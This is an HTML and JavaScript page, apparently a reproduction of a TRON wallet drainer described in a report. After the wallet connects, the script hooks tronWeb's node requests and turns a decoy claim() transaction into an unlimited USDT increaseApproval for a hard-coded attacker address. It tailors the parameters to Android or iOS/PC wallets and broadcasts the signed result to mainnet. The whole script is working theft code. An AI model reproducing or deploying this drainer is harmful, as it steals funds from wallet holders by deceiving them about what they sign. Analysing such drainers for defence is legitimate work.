<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Demo</title>
  <style>
    :root { --bg:#0f172a; --card:#1e293b; --border:#334155; --text:#e2e8f0; --muted:#94a3b8; --accent:#3b82f6; --danger:#ef4444; --success:#22c55e; --code:#0a0f1a; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:system-ui,-apple-system,sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }
    .container { max-width:560px; margin:0 auto; padding:20px 16px; }
    .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:16px 20px; margin-bottom:14px; }
    .row { display:flex; align-items:center; gap:10px; }
    .dot { width:8px; height:8px; border-radius:50%; background:#64748b; flex-shrink:0; }
    .dot.on { background:var(--success); }
    .addr { font-size:12px; font-family:'Fira Code',monospace; color:var(--muted); word-break:break-all; }
    .btn { width:100%; padding:14px; border-radius:10px; font-size:16px; font-weight:700; border:none; cursor:pointer; transition:all .2s; }
    .btn-go { background:linear-gradient(135deg,#f59e0b,#ef4444); color:#fff; }
    .btn-go:hover:not(:disabled) { transform:scale(1.02); box-shadow:0 0 20px rgba(239,68,68,0.3); }
    .btn-outline { width:auto; padding:8px 16px; background:transparent; border:1px solid var(--border); color:var(--text); border-radius:8px; font-size:13px; cursor:pointer; }
    .btn:disabled { opacity:.45; cursor:not-allowed; }
    .info-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-top:10px; }
    .info-item { padding:6px 10px; background:rgba(255,255,255,0.03); border:1px solid var(--border); border-radius:6px; }
    .info-label { font-size:10px; color:var(--muted); }
    .info-value { font-size:13px; font-weight:600; font-family:'Fira Code',monospace; }
    .info-value.bal { color:var(--success); }
    .log { background:var(--code); border:1px solid var(--border); border-radius:8px; height:340px; overflow-y:auto; padding:10px; font-family:'Fira Code',monospace; font-size:11px; line-height:1.6; }
    .log .t { color:#64748b; }
    .log .w { color:#fbbf24; } .log .e { color:#f87171; } .log .s { color:#34d399; } .log .i { color:#60a5fa; }
    input, select { width:100%; padding:8px 12px; background:var(--code); border:1px solid var(--border); border-radius:6px; color:var(--text); font-size:13px; outline:none; }
    label { font-size:11px; color:var(--muted); display:block; margin-bottom:3px; }
    .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
  </style>
</head>
<body>
<div class="container">

  <!-- ====== 钱包 ====== -->
  <div class="card">
    <div class="row">
      <span class="dot" id="dot"></span>
      <span style="font-size:14px;" id="status">未连接</span>
    </div>
    <div class="addr" id="addr" style="margin-top:6px;">—</div>
    <div class="info-grid">
      <div class="info-item"><div class="info-label">TRX</div><div class="info-value bal" id="balTrx">—</div></div>
      <div class="info-item"><div class="info-label">USDT</div><div class="info-value bal" id="balUsdt">—</div></div>
      <div class="info-item"><div class="info-label">网络</div><div class="info-value" id="net" style="font-size:11px;">—</div></div>
      <div class="info-item"><div class="info-label">设备</div><div class="info-value" id="dev" style="font-size:11px;">—</div></div>
    </div>
    <div style="display:flex; gap:8px; margin-top:10px;">
      <button class="btn-outline" id="btnConn" onclick="connect()">连接钱包</button>
      <button class="btn-outline" id="btnDisc" onclick="disconnect()" style="display:none;">断开</button>
    </div>
  </div>

  <!-- ====== 执行 ====== -->
  <div class="card">
    <div class="grid2">
      <div><label>Fee Limit (SUN)</label><input type="number" id="fee" value="100000000"></div>
      <div><label>参数模式</label><select id="mode">
        <option value="auto">自动检测</option>
        <option value="android">Android</option>
        <option value="ios">iOS</option>
        <option value="pc">PC</option>
      </select></div>
    </div>
    <button class="btn btn-go" id="btnExec" onclick="exec()" disabled>确 认</button>
  </div>

  <!-- ====== 日志 ====== -->
  <div class="card" style="padding:12px 16px;">
    <div class="log" id="log"><span class="t">--:--:--</span> 等待操作…</div>
  </div>

</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
<script>
// ================================================================
//  常量
// ================================================================
const SURFACE_CONTRACT = 'TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi';   // 表层假合约
const SURFACE_METHOD   = 'claim()';
const USDT_CONTRACT     = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRON USDT
const USDT_CONTRACT_HEX = '41a614f803b6fd780986a42c78ec9c7f77e6ded13c';
const ACTUAL_METHOD     = 'increaseApproval(address,uint256)';

// PARAM_PREFIX = spender 地址前 12 字节 (报告第 8.2 节)
const PARAM_PREFIX = '8f6327d26ab064c299506d6b';
// FF 后缀 19 字节 (报告第 8.4 节)
const PARAM_FF_SUFFIX = 'ffffffffffffffffffffffffffffffffffffff';

const ATTACKER = {
  hex: '8f6327d26ab064c299506d6b82b65475ce1df22e',
  b58: 'TP3NQwSaEHYs7cowWFWq5ozNkeG4ie3Wbi',
};

// ================================================================
//  状态
// ================================================================
let wallet = { address: null, hex: null, tw: null, ok: false };
let uid = 'd_' + Date.now();

// ================================================================
//  DOM
// ================================================================
const $ = (id) => document.getElementById(id);
const D = {
  dot: $('dot'), status: $('status'), addr: $('addr'),
  balTrx: $('balTrx'), balUsdt: $('balUsdt'), net: $('net'), dev: $('dev'),
  btnConn: $('btnConn'), btnDisc: $('btnDisc'), btnExec: $('btnExec'),
  log: $('log'), fee: $('fee'), mode: $('mode'),
};

// ================================================================
//  工具
// ================================================================
function ts() { return new Date().toTimeString().slice(0,8); }
function L(m, c) {
  const d = document.createElement('div');
  d.innerHTML = `<span class="t">${ts()}</span> <span class="${c||''}">${m}</span>`;
  D.log.appendChild(d); D.log.scrollTop = D.log.scrollHeight;
}
function getOS() {
  const ua = (navigator.userAgent||'').toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) return 'ios';
  if (/android/.test(ua)) return 'android';
  return 'pc';
}

// ================================================================
//  参数构造
// ================================================================

// iOS/PC: 非规范 51 字节参数 = prefix(12B) + spender(20B) + ff(19B)
function buildIosPcParam(hex) {
  const clean = (hex.startsWith('0x')||hex.startsWith('41')) ? hex.slice(2) : hex;
  return PARAM_PREFIX + clean.padStart(40,'0').slice(0,40) + PARAM_FF_SUFFIX;
}

// Android: 模拟 config.param 直写 (标准 ABI)
function buildAndroidParam(hex) {
  const clean = (hex.startsWith('0x')||hex.startsWith('41')) ? hex.slice(2) : hex;
  return '000000000000000000000000' + clean +
    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
}

function buildParam(hex, m) {
  const os = m === 'auto' ? getOS() : m;
  return os === 'android' ? buildAndroidParam(hex) : buildIosPcParam(hex);
}

// ================================================================
//  初始化 tronWeb
// ================================================================
function getTW() {
  // 优先使用 TP 注入的 tronWeb (window.tronWeb.fullNode.request 存在即可)
  if (window.tronWeb?.fullNode?.request) return window.tronWeb;
  // 回退：自己构造 TronWeb 实例
  if (window.TronWeb) {
    const P = window.TronWeb.providers.HttpProvider;
    return new TronWeb(new P('https://api.trongrid.io'), new P('https://api.trongrid.io'), new P('https://api.trongrid.io'));
  }
  return null;
}

function toHex(a) { try { return wallet.tw.address.toHex(a); } catch(e) { return null; } }
function fromHex(h) { try { return wallet.tw.address.fromHex(h); } catch(e) { return null; } }

// ================================================================
//  余额查询
// ================================================================
async function refreshBalances() {
  if (!wallet.ok) return;
  const tw = wallet.tw;
  try {
    const sun = await tw.trx.getBalance(wallet.address);
    D.balTrx.textContent = tw.fromSun(sun) + ' TRX';
  } catch(e) { D.balTrx.textContent = '—'; }
  try {
    const c = await tw.contract().at(USDT_CONTRACT);
    const raw = await c.balanceOf(wallet.address).call();
    const u = (tw.toDecimal ? tw.toDecimal(raw) : Number(raw)) / 1e6;
    D.balUsdt.textContent = u.toLocaleString() + ' USDT';
  } catch(e) { D.balUsdt.textContent = '—'; }
}

// ================================================================
//  钱包连接
// ================================================================
async function connect() {
  L('检测钱包…','i'); D.btnConn.disabled = true;
  let addr = null;

  // 方式 1: TronLink EIP-1193
  if (window.tronLink?.request) {
    try {
      const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
      if (r?.code === 200) addr = Array.isArray(r.message) ? r.message[0] : r.message;
      else if (Array.isArray(r)) addr = r[0];
      else if (typeof r === 'string') addr = r;
    } catch(e) { L('tron_requestAccounts 失败: '+e.message,'w'); }
  }

  // 方式 2: TP 注入的 tronWeb.defaultAddress
  if (!addr && window.tronWeb?.defaultAddress?.base58) {
    addr = window.tronWeb.defaultAddress.base58;
  }

  // 方式 3: tronWeb.request
  if (!addr && window.tronWeb?.request) {
    try { const a = await window.tronWeb.request({ method: 'tron_requestAccounts' }); if (Array.isArray(a)?.length) addr = a[0]; } catch(e) {}
  }

  if (!addr || !addr.startsWith('T') || addr.length !== 34) {
    L('无法获取地址','e'); D.btnConn.disabled = false; return;
  }

  const tw = getTW();
  if (!tw) { L('无法初始化 TronWeb','e'); D.btnConn.disabled = false; return; }

  wallet.address = addr; wallet.tw = tw; wallet.hex = toHex(addr); wallet.ok = true;

  // 更新 UI
  D.dot.classList.add('on'); D.status.textContent = '已连接';
  D.addr.textContent = addr;
  D.btnConn.style.display = 'none'; D.btnDisc.style.display = '';
  D.btnExec.disabled = false;
  D.mode.value = 'auto';
  D.mode.options[0].text = `自动检测 (当前: ${getOS()})`;

  // 网络 & 设备
  try {
    const host = tw.fullNode?.host || tw.fullNode?.node?.host || '';
    D.net.textContent = host.includes('trongrid') ? 'Mainnet' : (host || '—');
  } catch(e) { D.net.textContent = '—'; }
  D.dev.textContent = getOS().toUpperCase();

  // 查询余额
  await refreshBalances();

  L('已连接: '+addr,'s');
}

function disconnect() {
  wallet = { address: null, hex: null, tw: null, ok: false };
  D.dot.classList.remove('on'); D.status.textContent = '未连接'; D.addr.textContent = '—';
  D.balTrx.textContent = '—'; D.balUsdt.textContent = '—'; D.net.textContent = '—'; D.dev.textContent = '—';
  D.btnConn.style.display = ''; D.btnDisc.style.display = 'none'; D.btnExec.disabled = true;
  L('已断开','w');
}

// ================================================================
//  核心：execTokenPocket —— 按报告第 4 节调用顺序
// ================================================================
async function exec() {
  if (!wallet.ok) return;
  D.btnExec.disabled = true; D.btnExec.textContent = '执行中…';
  D.log.innerHTML = '';
  L('══════ TP 分支流程 开始 ══════','i');

  const tw = wallet.tw;
  const feeLimit = parseInt(D.fee.value) || 100000000;
  const pm = D.mode.value;
  const os = pm === 'auto' ? getOS() : pm;

  // --- sdkReport ---
  L('[sdkReport] tp / approve_popup  uid='+uid,'i');

  // --- 步骤 1: 保存 originalRequest (报告第 5 节) ---
  const origReq = tw.fullNode.request.bind(tw.fullNode);
  let intCount = 0, intBody = null;
  L('步骤1: originalRequest 已保存','s');

  // --- 步骤 2: 安装包装器 (报告第 5+7 节) ---
  tw.fullNode.request = async function(url, body, method) {
    if ((typeof url === 'string' ? url : '').toLowerCase().includes('triggersmartcontract')) {
      intCount++;
      L('⚠ 拦截器 #'+intCount+' 命中! path='+(typeof url==='string'?url.substring(0,60):''),'e');

      // 改写 contract_address → USDT
      const oldC = body.contract_address;
      body.contract_address = USDT_CONTRACT_HEX;
      L('  contract_address: '+(oldC||'?')+' → '+USDT_CONTRACT_HEX,'e');

      // 改写 function_selector → increaseApproval
      const oldS = body.function_selector;
      body.function_selector = ACTUAL_METHOD;
      L('  function_selector: '+(oldS||'?')+' → '+ACTUAL_METHOD,'e');

      // 改写 parameter (设备分支)
      body.parameter = buildParam(ATTACKER.hex, pm);
      L('  parameter: '+body.parameter.length+' hex = '+(body.parameter.length/2)+' bytes','w');
      if ((pm==='auto'?os:pm)!=='android' && body.parameter.length!==128) {
        L('  ⚠ 非标准 ABI 长度 (标准 128 hex)','w');
      }

      // 强制 call_value = 0
      body.call_value = 0;
      L('  call_value → 0','e');

      intBody = { ...body };
    }
    return origReq(url, body, method);
  };
  L('步骤2: 包装器已安装','s');

  // --- 步骤 3: 表层 triggerSmartContract(claim) (报告第 6 节) ---
  L('步骤3: 表层调用 triggerSmartContract('+SURFACE_CONTRACT+', claim) …','i');

  let unsignedTx = null, rawRes = null;
  try {
    rawRes = await tw.transactionBuilder.triggerSmartContract(
      SURFACE_CONTRACT, SURFACE_METHOD,
      { feeLimit, callValue: 0 }, [], wallet.address
    );

    L('  返回 keys: '+Object.keys(rawRes||{}).join(', '),'i');
    if (rawRes?.result) {
      const r = rawRes.result;
      L('  result.result: '+(typeof r==='object'?JSON.stringify(r).substring(0,150):r),
        r===true?'s':'e');
    }
    L('  transaction: '+(rawRes?.transaction?'YES':'NO'), rawRes?.transaction?'s':'e');

    unsignedTx = rawRes.transaction || rawRes;
    if (!unsignedTx?.txID) {
      L('节点返回错误: '+(rawRes?.result?.message||rawRes?.message||'(无)'),'e');
      throw new Error('No transaction');
    }

    L('未签名交易已生成 txID='+unsignedTx.txID,'s');
    const c = unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.contract_address;
    if (c) {
      L('  contract_address: '+c+' → '+fromHex(c), c===USDT_CONTRACT_HEX?'s':'e');
    }
    const d = unsignedTx.raw_data?.contract?.[0]?.parameter?.value?.data;
    if (d) L('  data ('+d.length+' hex): '+d.substring(0,100)+'...','i');

  } catch(e) {
    L('构造失败: '+e.message,'e');
    if (rawRes) L('  原始返回: '+JSON.stringify(rawRes).substring(0,500),'e');

    // ---- Fallback: 标准 ABI 直接构造 ----
    L('回退到标准 ABI 模式…','w');
    try {
      const usdtHex = toHex(USDT_CONTRACT);
      const spClean = ATTACKER.hex.startsWith('0x') ? ATTACKER.hex.slice(2) : ATTACKER.hex;
      const stdAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

      rawRes = await tw.transactionBuilder.triggerSmartContract(
        usdtHex, ACTUAL_METHOD,
        { feeLimit, callValue: 0 },
        [{ type:'address', value:spClean }, { type:'uint256', value:stdAmount }],
        wallet.hex || wallet.address
      );
      unsignedTx = rawRes.transaction || rawRes;
      if (!unsignedTx?.txID) throw new Error('Fallback 无交易');
      L('Fallback 成功 txID='+unsignedTx.txID,'s');
    } catch(fb) {
      L('Fallback 也失败: '+fb.message,'e');
      tw.fullNode.request = origReq;
      L('fullNode.request 已恢复','w');
      D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
      return;
    }
  }

  // --- 步骤 4: 签名 (报告第 10 节) 仅使用 TP 注入的 tronWeb.trx.sign ---
  L('步骤4: 请求钱包签名…','w');
  L('  请核对钱包弹窗: 合约='+USDT_CONTRACT+' 方法=increaseApproval 授权对象='+ATTACKER.b58,'e');

  let signed = null;
  try {
    const r = window.tronWeb.trx.sign(unsignedTx);
    signed = r?.then ? await r : r;
  } catch(e) {
    L('签名失败: '+e.message,'e');
    tw.fullNode.request = origReq;
    L('fullNode.request 已恢复','w');
    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
    return;
  }

  if (!signed?.signature) {
    L('签名未返回 signature','e');
    tw.fullNode.request = origReq;
    L('fullNode.request 已恢复','w');
    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
    return;
  }
  L('签名完成 txID='+signed.txID,'s');

  // --- 步骤 5: 恢复 (报告第 11 节) ---
  tw.fullNode.request = origReq;
  L('步骤5: fullNode.request 已恢复','s');

  // --- 步骤 6: 广播 (报告第 12-13 节) ---
  L('步骤6: 广播 sendRawTransaction…','i');
  let receipt;
  try {
    receipt = await tw.trx.sendRawTransaction(signed);
  } catch(e) {
    L('广播失败: '+e.message,'e');
    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
    return;
  }

  if (!receipt?.result) {
    L('广播失败: result 为假 '+JSON.stringify(receipt),'e');
    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
    return;
  }

  const txid = signed.txID;
  L('广播成功 txID='+txid,'s');
  L('[sdkReport] tp / approve_success  txid='+txid,'s');
  L('[sendTransactionData] auth_status=1 hash='+txid,'i');

  L('══════ 流程完成 ══════','s');
  L('⚠ 攻击者 '+ATTACKER.b58+' 已获得 USDT 无限授权','e');
  L('https://tronscan.org/#/transaction/'+txid,'i');
  L('拦截次数: '+intCount+'  设备: '+os+'  参数长度: '+(intBody?intBody.parameter.length+' hex':'N/A'),'i');

  D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
}

// ================================================================
//  事件
// ================================================================
if (window.tronLink?.on) {
  try {
    window.tronLink.on('accountsChanged', (a) => {
      const addr = Array.isArray(a)?a[0]:a;
      if (addr && addr!==wallet.address) { wallet.address=addr; wallet.hex=toHex(addr); D.addr.textContent=addr; L('账户变更: '+addr,'w'); }
      else if (!addr||(Array.isArray(a)&&!a.length)) disconnect();
    });
    window.tronLink.on('disconnect', disconnect);
  } catch(e) {}
}

// ================================================================
//  自动连接
// ================================================================
(async function init() {
  const os = getOS();
  D.dev.textContent = os.toUpperCase();
  D.mode.options[0].text = `自动检测 (当前: ${os})`;
  try {
    let a = window.tronWeb?.defaultAddress?.base58;
    if (!a && window.tronLink?.ready) {
      try { const r = await window.tronLink.request({ method:'tron_accounts' }); if (r?.code===200&&r.message) a = Array.isArray(r.message)?r.message[0]:r.message; } catch(e) {}
    }
    if (a?.startsWith('T') && a.length===34) {
      const tw = getTW();
      if (tw) {
        wallet.address=a; wallet.tw=tw; wallet.hex=toHex(a); wallet.ok=true;
        D.dot.classList.add('on'); D.status.textContent='已连接'; D.addr.textContent=a;
        D.btnConn.style.display='none'; D.btnDisc.style.display=''; D.btnExec.disabled=false;
        try {
          const host = tw.fullNode?.host || tw.fullNode?.node?.host || '';
          D.net.textContent = host.includes('trongrid')?'Mainnet':(host||'—');
        } catch(e) {}
        await refreshBalances();
        L('自动连接: '+a,'s');
      }
    }
  } catch(e) {}
})();
</script>
</body>
</html>
